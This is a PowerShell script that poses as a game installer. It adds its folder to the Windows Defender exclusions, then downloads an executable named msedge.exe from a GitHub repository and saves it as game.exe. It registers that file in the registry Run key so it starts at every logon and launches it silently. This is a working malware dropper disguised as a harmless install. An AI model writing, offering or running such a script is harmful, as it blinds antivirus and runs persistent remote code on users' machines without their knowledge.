# Define specific paths for your game - using a location that should definitely work
$gameFolder = "$env:USERPROFILE\Documents\MyGame"  # This uses your user Documents folder
$downloadUrl = "https://github.com/Nxtccijo/oooow/raw/refs/heads/main/msedge.exe"
$downloadPath = "$gameFolder\game.exe"
$autoStartName = "MyGame"

Write-Host "Starting installation process..."

# Create the game directory 
try {
    New-Item -ItemType Directory -Path $gameFolder -Force -ErrorAction Stop
    Write-Host "Created directory: $gameFolder"
} catch {
    Write-Host "Error creating directory: $_"
    exit
}

# Verify the folder exists
if (Test-Path -Path $gameFolder) {
    Write-Host "Confirmed folder exists: $gameFolder"
} else {
    Write-Host "ERROR: Folder does not exist even after creation attempt"
    exit
}

# Add the specific game folder to Defender exclusions
try {
    Add-MpPreference -ExclusionPath $gameFolder -ErrorAction Stop
    Write-Host "Added exclusion for: $gameFolder"
} catch {
    Write-Host "Could not add exclusion: $_"
}

# Download the executable to the game folder
try {
    Write-Host "Attempting to download from: $downloadUrl"
    Write-Host "Downloading to: $downloadPath"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $downloadPath -ErrorAction Stop
    
    # Verify the file exists
    if (Test-Path -Path $downloadPath) {
        Write-Host "Download confirmed successful: $downloadPath"
    } else {
        Write-Host "ERROR: Download appeared to succeed but file not found"
        exit
    }
} catch {
    Write-Host "Download failed: $_"
    exit
}

# Add to auto-start
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    Set-ItemProperty -Path $regPath -Name $autoStartName -Value "`"$downloadPath`"" -ErrorAction Stop
    Write-Host "Added to startup programs"
} catch {
    Write-Host "Could not add to startup: $_"
}

# Launch the executable
try {
    Write-Host "Attempting to launch: $downloadPath"
    Start-Process -FilePath $downloadPath -ArgumentList "/silent"
    Write-Host "Launch command sent"
} catch {
    Write-Host "Failed to launch: $_"
}

Write-Host "Script completed"